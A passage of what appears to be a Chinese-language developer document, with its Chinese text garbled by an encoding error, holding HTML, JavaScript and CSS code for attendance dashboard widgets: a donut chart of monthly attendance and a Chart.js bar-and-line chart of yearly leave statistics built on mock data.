        // ç¤ºä¾‹ï¼šæ ¹æ®æ—¶é—´ç²’åº¦æ˜¾ç¤ºä¸åŒçš„ä¸­å¿ƒæ–‡æœ¬
        updateCenterText(selectedTime, granularity);
        
        // æ¨¡æ‹Ÿä»åç«¯è·å–çš„æ•°æ®
        const mockData = {
            projectName: 'ç™¾é¦™æœé¡¹ç›®',
            totalPeople: 54,
            expectedAttendance: 150,
            actualAttendance: 98,
            absenceCount: 43,
            attendanceRate: 0.80,
            absenceRate: 0.45
        };
        
        // æ›´æ–°å›¾è¡¨æ˜¾ç¤º
        updateChart(mockData);
    }

    /**
     * åŠ è½½é»˜è®¤æ•°æ®
     */
    function loadDefaultData() {
        console.log('ä½¿ç”¨é»˜è®¤æ•°æ®');
        const defaultData = {
            projectName: 'ç™¾é¦™æœé¡¹ç›®',
            totalPeople: 54,
            expectedAttendance: 150,
            actualAttendance: 98,
            absenceCount: 43,
            attendanceRate: 0.80,
            absenceRate: 0.45
        };
        updateChart(defaultData);
    }

    /**
     * æ›´æ–°ä¸­å¿ƒæ–‡æœ¬
     */
    function updateCenterText(selectedTime, granularity) {
        const centerText = document.getElementById('centerText');
        
        if (granularity === 'å¹´') {
            // æå–å¹´ä»½ï¼Œä¾‹å¦‚ "2025" -> "2025å¹´"
            const year = selectedTime.split('-')[0];
            centerText.textContent = year + 'å¹´';
        } else if (granularity === 'æœˆ') {
            // æå–æœˆä»½ï¼Œä¾‹å¦‚ "2025-10" -> "10æœˆ"
            const month = selectedTime.split('-')[1];
            centerText.textContent = parseInt(month) + 'æœˆ';
        } else if (granularity === 'æ—¥') {
            // æå–æ—¥æœŸï¼Œä¾‹å¦‚ "2025-10-14" -> "10/14"
            const parts = selectedTime.split('-');
            centerText.textContent = `${parseInt(parts[1])}/${parts[2]}`;
        }
    }

    /**
     * æ›´æ–°å›¾è¡¨æ•°æ®
     */
    function updateChart(data) {
        // æ›´æ–°æ ‡é¢˜
        const header = document.getElementById('headerTitle');
        header.textContent = `${data.projectName}ï¼ˆ${data.totalPeople}äººï¼‰ï¼šåº”å‡ºå‹¤äººæ¬¡æ•° ${data.expectedAttendance}äººæ¬¡`;
        
        // æ›´æ–°æ•°å€¼æ˜¾ç¤º
        const attendanceValue = document.getElementById('attendanceValue');
        const absenceValue = document.getElementById('absenceValue');
        
        attendanceValue.textContent = `${data.actualAttendance}/${Math.round(data.attendanceRate * 100)}%`;
        absenceValue.textContent = `${data.absenceCount}/${Math.round(data.absenceRate * 100)}%`;
        
        // æ›´æ–°ç¯å½¢å›¾
        updateDonutChart(data.attendanceRate, data.absenceRate);
    }

    /**
     * æ›´æ–°ç¯å½¢å›¾æ˜¾ç¤º
     */
    function updateDonutChart(attendanceRate, absenceRate) {
        const circumference = 2 * Math.PI * 45; // åœ†çš„å‘¨é•¿
        
        // è®¡ç®—å®é™…å‡ºå‹¤çš„å¼§é•¿
        const attendanceLength = circumference * attendanceRate;
        const attendanceCircle = document.getElementById('attendanceCircle');
        attendanceCircle.setAttribute('stroke-dasharray', `${attendanceLength} ${circumference}`);
        
        // è®¡ç®—ç¼ºå‹¤çš„å¼§é•¿
        const absenceLength = circumference * absenceRate;
        const absenceCircle = document.getElementById('absenceCircle');
        absenceCircle.setAttribute('stroke-dasharray', `${absenceLength} ${circumference}`);
        absenceCircle.setAttribute('stroke-dashoffset', `-${attendanceLength}`);
    }

    /**
     * ç»‘å®šäº‹ä»¶
     */
    function bindEvents() {
        // æœˆæŠ¥è¡¨é“¾æ¥ç‚¹å‡»äº‹ä»¶
        document.getElementById('reportLink').addEventListener('click', function(e) {
            e.preventDefault();
            console.log('ç‚¹å‡»æœˆæŠ¥è¡¨');
            // TODO: å®ç°è·³è½¬åˆ°æœˆæŠ¥è¡¨çš„é€»è¾‘
            alert('æŸ¥çœ‹æœˆæŠ¥è¡¨åŠŸèƒ½');
        });
        
        // å¾…æä½œæŒ‰é’®ç‚¹å‡»äº‹ä»¶
        document.getElementById('actionBtn').addEventListener('click', function() {
            console.log('ç‚¹å‡»å¾…æä½œæŒ‰é’®');
            // TODO: å®ç°å¾…æä½œåŠŸèƒ½
            alert('å¾…æä½œåŠŸèƒ½');
        });
    }
</script>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        width: 100vw;
        height: 100vh;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
        background: #fff;
        padding: 3.5vw;
        display: flex;
        flex-direction: column;
        overflow: hidden;
    }

    /* å†…å®¹åŒºåŸŸæ ·å¼ */
    .header {
        font-size: 3.4vw;
        color: #333;
        margin-bottom: 2.8vh;
        font-weight: 500;
        line-height: 1.3;
    }
    
    .chart-container {
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        position: relative;
        min-height: 0;
    }
    
    .donut-chart {
        position: relative;
        width: 34vw;
        height: 34vw;
        max-width: 63vh;
        max-height: 63vh;
    }
    
    .donut-svg {
        transform: rotate(-90deg);
        width: 100%;
        height: 100%;
    }
    
    .center-text {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        text-align: center;
        font-size: 4vw;
        color: #666;
        font-weight: 500;
    }
    
    .label {
        position: absolute;
        font-size: 2.8vw;
        color: #333;
        display: flex;
        flex-direction: column;
        align-items: center;
        text-align: center;
        line-height: 1.4;
    }
    
    .label-value {
        font-weight: 600;
        color: #333;
        margin-top: 0.5vh;
        font-size: 3vw;
    }
    
    .label-desc {
        color: #666;
        white-space: nowrap;
    }
    
    .label-left {
        left: -13.7vw;
        top: 50%;
        transform: translateY(-50%);
    }
    
    .label-right {
        right: -14.8vw;
        top: 50%;
        transform: translateY(-50%);
    }
    
    .footer {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 2.8vh;
        padding-top: 2.2vh;
        border-top: 1px solid #f0f0f0;
    }
    
    .link {
        display: flex;
        align-items: center;
        font-size: 3.1vw;
        color: #1890ff;
        text-decoration: none;
        cursor: pointer;
    }
    
    .link:hover {
        color: #40a9ff;
    }
    
    .link-icon {
        width: 4vw;
        height: 4vw;
        margin-right: 1.2vw;
    }
    
    .btn {
        background: #7c5cef;
        color: white;
        border: none;
        padding: 1.4vh 4vw;
        border-radius: 1.2vw;
        font-size: 3.1vw;
        cursor: pointer;
        transition: background 0.3s;
        white-space: nowrap;
    }
    
    .btn:hover {
        background: #6a4dd4;
    }
    
    .btn:active {
        transform: scale(0.98);
    }
</style>
</html>
```

### 5ã€é‡æ„æœˆæŠ¥è¡¨

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ç¯å½¢å›¾æ•°æ®å±•ç¤º</title>
</head>
<body>

<!-- TODO æ”¾çš„å†…å®¹-->
<div class="header" id="headerTitle">ç™¾é¦™æœé¡¹ç›®ï¼ˆ54äººï¼‰ï¼šåº”å‡ºå‹¤äººæ¬¡æ•° 150äººæ¬¡</div>

<div class="chart-container">
    <div class="donut-chart">
        <svg class="donut-svg" viewBox="0 0 120 120" preserveAspectRatio="xMidYMid meet">
            <!-- èƒŒæ™¯åœ†ç¯ -->
            <circle cx="60" cy="60" r="45" fill="none" stroke="#f0f0f0" stroke-width="18"/>
            
            <!-- æ©™è‰²éƒ¨åˆ† (å®é™…å‡ºå‹¤) -->
            <circle id="attendanceCircle" cx="60" cy="60" r="45" fill="none" stroke="#ffbb96" stroke-width="18"
                    stroke-dasharray="226 283" stroke-linecap="round"/>
            
            <!-- ç»¿è‰²éƒ¨åˆ† (ç¼ºå‹¤) -->
            <circle id="absenceCircle" cx="60" cy="60" r="45" fill="none" stroke="#95de64" stroke-width="18"
                    stroke-dasharray="127 382" stroke-dashoffset="-226" stroke-linecap="round"/>
        </svg>
        
        <div class="center-text" id="centerText">9æœˆ</div>
        
        <!-- å·¦ä¾§æ ‡ç­¾ -->
        <div class="label label-left">
            <span class="label-desc">ç¼ºå‹¤äººæ¬¡æ•°</span>
            <span class="label-value" id="absenceValue">43/45%</span>
        </div>
        
        <!-- å³ä¾§æ ‡ç­¾ -->
        <div class="label label-right">
            <span class="label-desc">å®é™…å‡ºå‹¤äººæ¬¡æ•°</span>
            <span class="label-value" id="attendanceValue">98/80%</span>
        </div>
    </div>
</div>

<div class="footer">
    <a href="javascript:void(0);" class="link" id="reportLink">
        <svg class="link-icon" viewBox="0 0 1024 1024" fill="currentColor">
            <path d="M832 128H640v64h146.752L521.344 457.344l45.312 45.312L832 237.248V384h64V128z"/>
            <path d="M768 832H192V256h352v-64H160a32 32 0 0 0-32 32v640a32 32 0 0 0 32 32h640a32 32 0 0 0 32-32V480h-64v352z"/>
        </svg>
        æœˆæŠ¥è¡¨
    </a>
    <button class="btn" id="actionBtn">å¾…æä½œ</button>
</div>

</body>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const params = window.NODE_PARAMS || {};
        console.log('æ¥æ”¶åˆ°çš„å‚æ•°:', params);
        
        // æ ¹æ®å‚æ•°åŠ è½½æ•°æ®
        if (params.selected_time && params.time_granularity) {
            loadDataByTime(params.selected_time, params.time_granularity);
        } else {
            // æ²¡æœ‰å‚æ•°æ—¶ä½¿ç”¨é»˜è®¤æ•°æ®
            loadDefaultData();
        }
        
        // ç»‘å®šäº‹ä»¶
        bindEvents();
    });

    /**
     * æ ¹æ®æ—¶é—´åŠ è½½æ•°æ®
     * @param {string} selectedTime é€‰æ‹©çš„æ—¶é—´
     * @param {string} granularity æ—¶é—´ç»´åº¦ï¼ˆæ—¥ã€æœˆã€å¹´ï¼‰
     */
    function loadDataByTime(selectedTime, granularity) {
        console.log(`åŠ è½½æ•°æ®: æ—¶é—´=${selectedTime}, ç»´åº¦=${granularity}`);
        
        // TODO: è¿™é‡Œè°ƒç”¨åç«¯æ¥å£è·å–çœŸå®æ•°æ®
        // ç¤ºä¾‹ï¼šæ ¹æ®æ—¶é—´ç²’åº¦æ˜¾ç¤ºä¸åŒçš„ä¸­å¿ƒæ–‡æœ¬
        updateCenterText(selectedTime, granularity);
        
        // æ¨¡æ‹Ÿä»åç«¯è·å–çš„æ•°æ®
        const mockData = {
            projectName: 'ç™¾é¦™æœé¡¹ç›®',
            totalPeople: 54,
            expectedAttendance: 150,
            actualAttendance: 98,
            absenceCount: 43,
            attendanceRate: 0.80,
            absenceRate: 0.45
        };
        
        // æ›´æ–°å›¾è¡¨æ˜¾ç¤º
        updateChart(mockData);
    }

    /**
     * åŠ è½½é»˜è®¤æ•°æ®
     */
    function loadDefaultData() {
        console.log('ä½¿ç”¨é»˜è®¤æ•°æ®');
        const defaultData = {
            projectName: 'ç™¾é¦™æœé¡¹ç›®',
            totalPeople: 54,
            expectedAttendance: 150,
            actualAttendance: 98,
            absenceCount: 43,
            attendanceRate: 0.80,
            absenceRate: 0.45
        };
        updateChart(defaultData);
    }

    /**
     * æ›´æ–°ä¸­å¿ƒæ–‡æœ¬
     */
    function updateCenterText(selectedTime, granularity) {
        const centerText = document.getElementById('centerText');
        
        if (granularity === 'å¹´') {
            // æå–å¹´ä»½ï¼Œä¾‹å¦‚ "2025" -> "2025å¹´"
            const year = selectedTime.split('-')[0];
            centerText.textContent = year + 'å¹´';
        } else if (granularity === 'æœˆ') {
            // æå–æœˆä»½ï¼Œä¾‹å¦‚ "2025-10" -> "10æœˆ"
            const month = selectedTime.split('-')[1];
            centerText.textContent = parseInt(month) + 'æœˆ';
        } else if (granularity === 'æ—¥') {
            // æå–æ—¥æœŸï¼Œä¾‹å¦‚ "2025-10-14" -> "10/14"
            const parts = selectedTime.split('-');
            centerText.textContent = `${parseInt(parts[1])}/${parts[2]}`;
        }
    }

    /**
     * æ›´æ–°å›¾è¡¨æ•°æ®
     */
    function updateChart(data) {
        // æ›´æ–°æ ‡é¢˜
        const header = document.getElementById('headerTitle');
        header.textContent = `${data.projectName}ï¼ˆ${data.totalPeople}äººï¼‰ï¼šåº”å‡ºå‹¤äººæ¬¡æ•° ${data.expectedAttendance}äººæ¬¡`;
        
        // æ›´æ–°æ•°å€¼æ˜¾ç¤º
        const attendanceValue = document.getElementById('attendanceValue');
        const absenceValue = document.getElementById('absenceValue');
        
        attendanceValue.textContent = `${data.actualAttendance}/${Math.round(data.attendanceRate * 100)}%`;
        absenceValue.textContent = `${data.absenceCount}/${Math.round(data.absenceRate * 100)}%`;
        
        // æ›´æ–°ç¯å½¢å›¾
        updateDonutChart(data.attendanceRate, data.absenceRate);
    }

    /**
     * æ›´æ–°ç¯å½¢å›¾æ˜¾ç¤º
     */
    function updateDonutChart(attendanceRate, absenceRate) {
        const circumference = 2 * Math.PI * 45; // åœ†çš„å‘¨é•¿
        
        // è®¡ç®—å®é™…å‡ºå‹¤çš„å¼§é•¿
        const attendanceLength = circumference * attendanceRate;
        const attendanceCircle = document.getElementById('attendanceCircle');
        attendanceCircle.setAttribute('stroke-dasharray', `${attendanceLength} ${circumference}`);
        
        // è®¡ç®—ç¼ºå‹¤çš„å¼§é•¿
        const absenceLength = circumference * absenceRate;
        const absenceCircle = document.getElementById('absenceCircle');
        absenceCircle.setAttribute('stroke-dasharray', `${absenceLength} ${circumference}`);
        absenceCircle.setAttribute('stroke-dashoffset', `-${attendanceLength}`);
    }

    /**
     * ç»‘å®šäº‹ä»¶
     */
    function bindEvents() {
        // æœˆæŠ¥è¡¨é“¾æ¥ç‚¹å‡»äº‹ä»¶
        document.getElementById('reportLink').addEventListener('click', function(e) {
            e.preventDefault();
            console.log('ç‚¹å‡»æœˆæŠ¥è¡¨');
            // TODO: å®ç°è·³è½¬åˆ°æœˆæŠ¥è¡¨çš„é€»è¾‘
            alert('æŸ¥çœ‹æœˆæŠ¥è¡¨åŠŸèƒ½');
        });
        
        // å¾…æä½œæŒ‰é’®ç‚¹å‡»äº‹ä»¶
        document.getElementById('actionBtn').addEventListener('click', function() {
            console.log('ç‚¹å‡»å¾…æä½œæŒ‰é’®');
            // TODO: å®ç°å¾…æä½œåŠŸèƒ½
            alert('å¾…æä½œåŠŸèƒ½');
        });
    }
</script>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        width: 100vw;
        height: 100vh;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
        background: #fff;
        padding: 3.5vw;
        display: flex;
        flex-direction: column;
        overflow: hidden;
    }

    /* å†…å®¹åŒºåŸŸæ ·å¼ */
    .header {
        font-size: 3.4vw;
        color: #333;
        margin-bottom: 2.8vh;
        font-weight: 500;
        line-height: 1.3;
    }
    
    .chart-container {
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        position: relative;
        min-height: 0;
    }
    
    .donut-chart {
        position: relative;
        width: 34vw;
        height: 34vw;
        max-width: 63vh;
        max-height: 63vh;
    }
    
    .donut-svg {
        transform: rotate(-90deg);
        width: 100%;
        height: 100%;
    }
    
    .center-text {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        text-align: center;
        font-size: 4vw;
        color: #666;
        font-weight: 500;
    }
    
    .label {
        position: absolute;
        font-size: 2.8vw;
        color: #333;
        display: flex;
        flex-direction: column;
        align-items: center;
        text-align: center;
        line-height: 1.4;
    }
    
    .label-value {
        font-weight: 600;
        color: #333;
        margin-top: 0.5vh;
        font-size: 3vw;
    }
    
    .label-desc {
        color: #666;
        white-space: nowrap;
    }
    
    .label-left {
        left: -13.7vw;
        top: 50%;
        transform: translateY(-50%);
    }
    
    .label-right {
        right: -14.8vw;
        top: 50%;
        transform: translateY(-50%);
    }
    
    .footer {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 2.8vh;
        padding-top: 2.2vh;
        border-top: 1px solid #f0f0f0;
    }
    
    .link {
        display: flex;
        align-items: center;
        font-size: 3.1vw;
        color: #1890ff;
        text-decoration: none;
        cursor: pointer;
    }
    
    .link:hover {
        color: #40a9ff;
    }
    
    .link-icon {
        width: 4vw;
        height: 4vw;
        margin-right: 1.2vw;
    }
    
    .btn {
        background: #7c5cef;
        color: white;
        border: none;
        padding: 1.4vh 4vw;
        border-radius: 1.2vw;
        font-size: 3.1vw;
        cursor: pointer;
        transition: background 0.3s;
        white-space: nowrap;
    }
    
    .btn:hover {
        background: #6a4dd4;
    }
    
    .btn:active {
        transform: scale(0.98);
    }
</style>
</html>
```

### 6ã€é‡æ„å¹´æŠ¥è¡¨

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>å‡ºå‹¤ç»Ÿè®¡</title>
</head>
<body>

<!-- TODO æ”¾çš„å†…å®¹-->
<div class="chart-wrapper">
    <div class="header">
        <div class="year" id="yearTitle">2025å¹´</div>
        <div class="subtitle" id="subtitleText">ç™¾é¦™æœç­çº§ï¼ˆ85äººï¼Œåº”å‡ºå‹¤äººæ¬¡æ•°1823äººæ¬¡ï¼‰</div>
    </div>

    <div class="chart-container">
        <canvas id="attendanceChart"></canvas>
    </div>
</div>

</body>

<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
<script>
    let chart = null;

    document.addEventListener('DOMContentLoaded', function() {
        const params = window.NODE_PARAMS || {};
        console.log('æ¥æ”¶åˆ°çš„å‚æ•°:', params);
        
        // æ ¹æ®å‚æ•°åŠ è½½æ•°æ®
        if (params.selected_time && params.time_granularity) {
            loadDataByTime(params.selected_time, params.time_granularity);
        } else {
            // æ²¡æœ‰å‚æ•°æ—¶ä½¿ç”¨é»˜è®¤æ•°æ®
            loadDefaultData();
        }
    });

    /**
     * æ ¹æ®æ—¶é—´åŠ è½½æ•°æ®
     * @param {string} selectedTime é€‰æ‹©çš„æ—¶é—´
     * @param {string} granularity æ—¶é—´ç»´åº¦ï¼ˆæ—¥ã€æœˆã€å¹´ï¼‰
     */
    function loadDataByTime(selectedTime, granularity) {
        console.log(`åŠ è½½æ•°æ®: æ—¶é—´=${selectedTime}, ç»´åº¦=${granularity}`);
        
        // æ›´æ–°æ ‡é¢˜æ˜¾ç¤º
        updateTitle(selectedTime, granularity);
        
        // TODO: è¿™é‡Œè°ƒç”¨åç«¯æ¥å£è·å–çœŸå®æ•°æ®
        // æ ¹æ®æ—¶é—´ç²’åº¦è·å–ä¸åŒçš„æ•°æ®
        const mockData = getMockDataByGranularity(granularity, selectedTime);
        
        // æ¸²æŸ“å›¾è¡¨
        renderChart(mockData);
    }

    /**
     * åŠ è½½é»˜è®¤æ•°æ®
     */
    function loadDefaultData() {
        console.log('ä½¿ç”¨é»˜è®¤æ•°æ®');
        const defaultData = {
            className: 'ç™¾é¦™æœç­çº§',
            totalPeople: 85,
            expectedAttendance: 1823,
            labels: ['å…­æœˆ', 'ä¸ƒæœˆ', 'åä¸€æœˆ', 'ä¸€æœˆ', 'äºŒæœˆ', 'ä¸‰æœˆ', 'å››æœˆ', 'äº”æœˆ', 'å…­æœˆ', 'ä¸ƒæœˆ', 'å…«æœˆ'],
            attendanceRate: [100, 100, 100, 100, 100, 100, 100, 100, 100, 100, 100],
            actualData: [22, 45, 12, 48, 18, 42, 25, 85, 50, 22, 3],
            sickLeave: [10, 4, 10, 5, 8, 12, 25, 0, 26, 12, 3],
            casualLeave: [10, 0, 0, 0, 0, 8, 0, 22, 0, 0, 0],
            otherLeave: [0, 0, 0, 0, 0, 0, 0, 0, 0, 20, 0]
        };
        
        updateSubtitle(defaultData);
        renderChart(defaultData);
    }

    /**
     * æ ¹æ®æ—¶é—´ç²’åº¦è·å–æ¨¡æ‹Ÿæ•°æ®
     */
    function getMockDataByGranularity(granularity, selectedTime) {
        // TODO: å®é™…åº”è¯¥ä»åç«¯æ¥å£è·å–æ•°æ®
        if (granularity === 'å¹´') {
            // å¹´åº¦æ•°æ®ï¼šæ˜¾ç¤º12ä¸ªæœˆ
            return {
                className: 'ç™¾é¦™æœç­çº§',
                totalPeople: 85,
                expectedAttendance: 1823,
                labels: ['1æœˆ', '2æœˆ', '3æœˆ', '4æœˆ', '5æœˆ', '6æœˆ', '7æœˆ', '8æœˆ', '9æœˆ', '10æœˆ', '11æœˆ', '12æœˆ'],
                attendanceRate: [98, 97, 99, 100, 98, 99, 97, 98, 100, 99, 98, 97],
                actualData: [25, 30, 22, 18, 20, 35, 40, 28, 15, 32, 27, 30],
                sickLeave: [8, 12, 5, 3, 6, 10, 15, 8, 2, 11, 9, 12],
                casualLeave: [5, 8, 3, 2, 4, 7, 10, 5, 1, 8, 6, 9],
                otherLeave: [2, 3, 1, 0, 1, 3, 5, 2, 0, 4, 3, 3]
            };
        } else if (granularity === 'æœˆ') {
            // æœˆåº¦æ•°æ®ï¼šæ˜¾ç¤ºå½“æœˆæ¯å¤©æˆ–æ¯å‘¨
            const month = selectedTime.split('-')[1];
            return {
                className: 'ç™¾é¦™æœç­çº§',
                totalPeople: 85,
                expectedAttendance: 150,
                labels: ['ç¬¬1å‘¨', 'ç¬¬2å‘¨', 'ç¬¬3å‘¨', 'ç¬¬4å‘¨'],
                attendanceRate: [100, 98, 99, 97],
                actualData: [12, 15, 10, 8],
                sickLeave: [5, 6, 4, 3],
                casualLeave: [3, 4, 2, 2],
                otherLeave: [1, 2, 1, 1]
            };
        } else {
            // æ—¥æ•°æ®ï¼šæ˜¾ç¤ºå°æ—¶æˆ–ç­æ¬¡
            return {
                className: 'ç™¾é¦™æœç­çº§',
                totalPeople: 85,
                expectedAttendance: 85,
                labels: ['ä¸Šåˆ', 'ä¸‹åˆ'],
                attendanceRate: [100, 98],
                actualData: [2, 3],
                sickLeave: [1, 2],
                casualLeave: [1, 1],
                otherLeave: [0, 0]
            };
        }
    }

    /**
     * æ›´æ–°æ ‡é¢˜
     */
    function updateTitle(selectedTime, granularity) {
        const yearTitle = document.getElementById('yearTitle');
        
        if (granularity === 'å¹´') {
            const year = selectedTime.split('-')[0];
            yearTitle.textContent = year + 'å¹´';
        } else if (granularity === 'æœˆ') {
            const parts = selectedTime.split('-');
            yearTitle.textContent = `${parts[0]}å¹´${parseInt(parts[1])}æœˆ`;
        } else if (granularity === 'æ—¥') {
            const parts = selectedTime.split('-');
            yearTitle.textContent = `${parts[0]}å¹´${parseInt(parts[1])}æœˆ${parseInt(parts[2])}æ—¥`;
        }
    }

    /**
     * æ›´æ–°å‰¯æ ‡é¢˜
     */
    function updateSubtitle(data) {
        const subtitle = document.getElementById('subtitleText');
        subtitle.textContent = `${data.className}ï¼ˆ${data.totalPeople}äººï¼Œåº”å‡ºå‹¤äººæ¬¡æ•°${data.expectedAttendance}äººæ¬¡ï¼‰`;
    }

    /**
     * æ¸²æŸ“å›¾è¡¨
     */
    function renderChart(data) {
        // å¦‚æœå›¾è¡¨å·²å­˜åœ¨ï¼Œå…ˆé”€æ¯
        if (chart) {
            chart.destroy();
        }

        const ctx = document.getElementById('attendanceChart').getContext('2d');

        chart = new Chart(ctx, {
            type: 'bar',
            data: {
                labels: data.labels,
                datasets: [
                    {
                        type: 'line',
                        label: 'å‡ºå‹¤ç‡',
                        data: data.attendanceRate,
                        borderColor: '#FF6B6B',
                        backgroundColor: 'transparent',
                        borderWidth: 2.5,
                        pointRadius: 5,
                        pointBackgroundColor: '#FF6B6B',
                        pointBorderColor: '#FF6B6B',
                        pointBorderWidth: 2,
                        yAxisID: 'y1',
                        order: 0,
                        tension: 0
                    },
                    {
                        label: 'å®å€¼',
                        data: data.actualData,
                        backgroundColor: '#4A9EFF',
                        barPercentage: 0.7,
                        categoryPercentage: 0.8,
                        yAxisID: 'y'
                    },
                    {
                        label: 'ç—…å‡',
                        data: data.sickLeave,
                        backgroundColor: '#52C7A5',
                        barPercentage: 0.7,
                        categoryPercentage: 0.8,
                        yAxisID: 'y'
                    },
                    {
                        label: 'äº‹å‡',
                        data: data.casualLeave,
                        backgroundColor: '#FFB84D',
                        barPercentage: 0.7,
                        categoryPercentage: 0.8,
                        yAxisID: 'y'
                    },
                    {
                        label: 'å…¶ä»–',
                        data: data.otherLeave,
                        backgroundColor: '#A8A8A8',
                        barPercentage: 0.7,
                        categoryPercentage: 0.8,
                        yAxisID: 'y'
                    }
                ]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                interaction: {
                    mode: 'index',
                    intersect: false
                },
                plugins: {
                    legend: {
                        display: true,
                        position: 'bottom',
                        labels: {
                            usePointStyle: true,
                            pointStyle: 'circle',
                            padding: 20,
                            font: {
                                size: 13,
                                family: '-apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif'
                            },
                            color: '#666',
                            boxWidth: 8,
                            boxHeight: 8
                        }
                    },
                    tooltip: {
                        backgroundColor: 'rgba(0, 0, 0, 0.75)',
                        padding: 10,
                        titleFont: {
                            size: 13
                        },
                        bodyFont: {
                            size: 12
                        },
                        cornerRadius: 4
                    }
                },
                scales: {
                    x: {
                        grid: {
                            display: false,
                            drawBorder: false
                        },
                        ticks: {
                            font: {
                                size: 13,
                                family: '-apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif'
                            },
                            color: '#666',
                            padding: 8
                        }
                    },
                    y: {
                        type: 'linear',
                        position: 'right',
                        beginAtZero: true,
                        max: 50,
                        title: {
                            display: true,
                            text: 'è¯·å‡äººæ¬¡æ•°ï¼ˆäººæ¬¡ï¼‰',
                            font: {
                                size: 12,
                                family: '-apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif'
                            },
                            color: '#999',
                            padding: 10
                        },
                        ticks: {
                            stepSize: 10,
                            callback: function(value) {
                                return value + ' äººæ¬¡';
                            },
                            font: {
                                size: 11,
                                family: '-apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif'
                            },
                            color: '#999',
                            padding: 8
                        },
                        grid: {
                            color: '#E8E8E8',
                            drawBorder: false,
                            lineWidth: 1
                        }
                    },
                    y1: {
                        type: 'linear',
                        position: 'left',
                        beginAtZero: true,
                        max: 100,
                        title: {
                            display: true,
                            text: 'å‡ºå‹¤ç‡ï¼ˆ%ï¼‰',
                            font: {
                                size: 12,
                                family: '-apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif'
                            },
                            color: '#999',
                            padding: 10
                        },
                        ticks: {
                            stepSize: 20,
                            callback: function(value) {
                                return value + ' %';
                            },
                            font: {
                                size: 11,
                                family: '-apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif'
                            },
                            color: '#999',
                            padding: 8
                        },
                        grid: {
                            display: false
                        }
                    }
                }
            }
        });

        // åº”ç”¨å“åº”å¼å°ºå¯¸
        updateChartSizes();
    }

    /**
     * è·å–å“åº”å¼å°ºå¯¸é…ç½®
     */
    function getResponsiveSizes() {
        const width = window.innerWidth;
        const height = window.innerHeight;
        const base = Math.min(width, height);
        
        return {
            legendFont: Math.max(10, base * 0.013),
            legendPadding: Math.max(12, base * 0.015),
            legendBox: Math.max(6, base * 0.008),
            tooltipFont: Math.max(10, base * 0.012),
            axisFont: Math.max(9, base * 0.011),
            titleFont: Math.max(10, base * 0.012),
            pointRadius: Math.max(3, base * 0.005),
            lineWidth: Math.max(1.5, base * 0.0025),
            padding: Math.max(6, base * 0.008)
        };
    }

    /**
     * æ›´æ–°å›¾è¡¨å°ºå¯¸
     */
    function updateChartSizes() {
        if (!chart) return;
        
        const sizes = getResponsiveSizes();
        
        chart.options.plugins.legend.labels.font.size = sizes.legendFont;
        chart.options.plugins.legend.labels.padding = sizes.legendPadding;
        chart.options.plugins.legend.labels.boxWidth = sizes.legendBox;
        chart.options.plugins.legend.labels.boxHeight = sizes.legendBox;
        
        chart.options.plugins.tooltip.titleFont.size = sizes.tooltipFont;
        chart.options.plugins.tooltip.bodyFont.size = sizes.tooltipFont - 1;
        chart.options.plugins.tooltip.padding = sizes.padding + 2;
        
        chart.options.scales.x.ticks.font.size = sizes.axisFont;
        chart.options.scales.x.ticks.padding = sizes.padding;
        
        chart.options.scales.y.title.font.size = sizes.titleFont;
        chart.options.scales.y.ticks.font.size = sizes.axisFont;
        chart.options.scales.y.ticks.padding = sizes.padding;
        
        chart.options.scales.y1.title.font.size = sizes.titleFont;
        chart.options.scales.y1.ticks.font.size = sizes.axisFont;
        chart.options.scales.y1.ticks.padding = sizes.padding;
        
        chart.data.datasets[0].pointRadius = sizes.pointRadius;
        chart.data.datasets[0].borderWidth = sizes.lineWidth;
        chart.data.datasets[0].pointBorderWidth = sizes.lineWidth * 0.8;
        
        chart.update('none');
    }

    // ç›‘å¬çª—å£å¤§å°å˜åŒ–
    window.addEventListener('resize', () => {
        updateChartSizes();
    });
</script>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        width: 100vw;
        height: 100vh;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
        background: #fff;
        padding: 3.5vw;
        display: flex;
        flex-direction: column;
        overflow: hidden;
    }

    /* å†…å®¹åŒºåŸŸæ ·å¼ */
    .chart-wrapper {
        width: 100%;
        height: 100%;
        display: flex;
        flex-direction: column;
        background: #fff;
        border-radius: 1vw;
        padding: 2vw;
    }

    .header {
        text-align: left;
        margin-bottom: 2vh;
        padding-left: 1vw;
    }

    .year {
        font-size: 2vw;
        font-weight: 600;
        color: #333;
        margin-bottom: 0.8vh;
        letter-spacing: 0.05em;
    }

    .subtitle {
        font-size: 1.2vw;
        color: #666;
        font-weight: 400;
    }

    .chart-container {
        flex: 1;
        width: 100%;
        position: relative;
        min-height: 0;
        padding: 1vw;
    }

    #attendanceChart {
        width: 100% !important;
        height: 100% !important;
    }
</style>
</html>
```

### æµ‹è¯•æ’ä»¶

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
